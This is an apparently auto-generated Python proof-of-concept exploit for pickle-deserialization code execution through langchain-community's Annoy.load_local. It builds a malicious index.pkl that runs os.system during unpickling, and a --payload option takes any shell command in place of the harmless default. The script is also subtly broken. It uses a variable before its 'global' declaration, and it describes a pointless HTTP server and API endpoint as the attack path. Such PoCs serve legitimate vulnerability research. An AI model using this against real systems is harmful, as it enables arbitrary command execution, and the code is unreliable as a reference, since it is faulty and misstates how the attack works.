#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community RCE via pickle deserialization.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file constructed from user-controlled folder_path.
The allow_dangerous_deserialization guard is a developer-controlled boolean flag
that does not validate the source of the file. An attacker who can control
folder_path can point to a malicious pickle file, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it via a simple HTTP server or local file path
3. Calling load_local with the malicious folder_path and allow_dangerous_deserialization=True

Usage:
    python3 poc.py [--target http://localhost:8000] [--local /tmp/malicious]
"""

import argparse
import os
import pickle
import sys
import tempfile
import subprocess
import time
import threading
import http.server
import socketserver
from pathlib import Path

# =============================================================================
# Configuration
# =============================================================================
DEFAULT_TARGET = "http://localhost:8000"  # Target API endpoint
DEFAULT_PORT = 9999  # Port for local HTTP server to serve malicious pickle
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"  # Safe command to demonstrate RCE

# =============================================================================
# Step 1: Create a malicious pickle file
# =============================================================================
class MaliciousPickle:
    """A class whose __reduce__ method executes a command when unpickled."""
    
    def __reduce__(self):
        # Return a tuple (callable, args) that will be called during unpickling
        return (os.system, (BENIGN_PAYLOAD,))

def create_malicious_pickle(output_path: str) -> None:
    """
    Create a pickle file that executes a command when loaded.
    
    Args:
        output_path: Path where the malicious pickle file will be written
    """
    # Create the malicious object
    malicious_obj = MaliciousPickle()
    
    # Serialize it to a pickle file
    with open(output_path, 'wb') as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[+] Created malicious pickle file at: {output_path}")
    print(f"[+] Payload: {BENIGN_PAYLOAD}")

# =============================================================================
# Step 2: Set up a local HTTP server to serve the malicious pickle
# =============================================================================
class QuietHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP request handler that suppresses log output."""
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

def start_http_server(directory: str, port: int) -> socketserver.TCPServer:
    """
    Start a simple HTTP server in a background thread.
    
    Args:
        directory: Directory to serve files from
        port: Port to listen on
    
    Returns:
        The server object (can be used to shut it down)
    """
    os.chdir(directory)
    handler = QuietHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), handler)
    
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    
    print(f"[+] HTTP server started on port {port}, serving directory: {directory}")
    return httpd

# =============================================================================
# Step 3: Simulate the vulnerable API call
# =============================================================================
def simulate_vulnerable_call(folder_path: str) -> None:
    """
    Simulate calling the vulnerable load_local function with attacker-controlled input.
    
    In a real attack, this would be called via the web API endpoint.
    Here we directly import and call the vulnerable function to demonstrate the exploit.
    
    Args:
        folder_path: Path to the folder containing the malicious pickle file
    """
    # Import the vulnerable function
    # Note: This assumes langchain-community is installed in the environment
    try:
        from langchain_community.vectorstores.annoy import Annoy
    except ImportError:
        print("[-] langchain-community not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "langchain-community"])
        from langchain_community.vectorstores.annoy import Annoy
    
    print(f"[+] Calling load_local with folder_path: {folder_path}")
    print(f"[+] allow_dangerous_deserialization=True")
    
    try:
        # This will trigger the malicious pickle deserialization
        # The benign command will be executed
        result = Annoy.load_local(
            folder_path=folder_path,
            embeddings=None,  # Will fail after command execution, but that's fine
            allow_dangerous_deserialization=True
        )
        print(f"[+] load_local returned: {result}")
    except Exception as e:
        # The command should have executed before any exception
        print(f"[!] Exception after command execution (expected): {e}")

# =============================================================================
# Step 4: Verify the exploit worked
# =============================================================================
def verify_exploit() -> bool:
    """
    Check if the benign payload was executed successfully.
    
    Returns:
        True if the payload was executed, False otherwise
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS: Marker file {marker_file} was created!")
        print("[+] The malicious pickle was deserialized and the command was executed.")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print(f"[-] FAILURE: Marker file {marker_file} was not found.")
        print("[-] The exploit may not have worked.")
        return False

# =============================================================================
# Main exploit function
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--local",
        help="Local path to serve malicious pickle from (creates temp dir if not specified)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Port for local HTTP server (default: {DEFAULT_PORT})"
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help=f"Command to execute (default: {BENIGN_PAYLOAD})"
    )
    
    args = parser.parse_args()
    
    # Update payload if custom one is provided
    global BENIGN_PAYLOAD
    BENIGN_PAYLOAD = args.payload
    
    print("=" * 60)
    print("langchain-community Pickle Deserialization RCE PoC")
    print("=" * 60)
    print()
    
    # Create a temporary directory for the malicious pickle
    if args.local:
        malicious_dir = args.local
        os.makedirs(malicious_dir, exist_ok=True)
    else:
        malicious_dir = tempfile.mkdtemp(prefix="poc_")
    
    # Create the malicious pickle file (must be named index.pkl as expected by load_local)
    pickle_path = os.path.join(malicious_dir, "index.pkl")
    create_malicious_pickle(pickle_path)
    
    # Also create a dummy index.annoy file (required by load_local but not used for exploit)
    # The load_local function also tries to load an Annoy index, but we can skip that
    # by providing a minimal file
    annoy_path = os.path.join(malicious_dir, "index.annoy")
    with open(annoy_path, 'wb') as f:
        f.write(b"dummy")  # Minimal content, will cause error but after command execution
    
    print()
    print("[*] Starting local HTTP server to serve malicious pickle...")
    httpd = start_http_server(malicious_dir, args.port)
    
    # Wait a moment for the server to start
    time.sleep(0.5)
    
    print()
    print("[*] Simulating the vulnerable API call...")
    print("[*] In a real attack, this would be triggered by sending a request to:")
    print(f"[*] {args.target}/api/v1/trigger with folder_path pointing to our server")
    print()
    
    # For this PoC, we directly call the vulnerable function with the local path
    # In a real attack, the folder_path would be a URL pointing to our malicious server
    simulate_vulnerable_call(malicious_dir)
    
    print()
    print("[*] Verifying exploit success...")
    success = verify_exploit()
    
    # Clean up
    httpd.shutdown()
    print()
    print("[*] Cleanup complete.")
    
    if success:
        print("[✓] Exploit successful!")
        sys.exit(0)
    else:
        print("[✗] Exploit failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
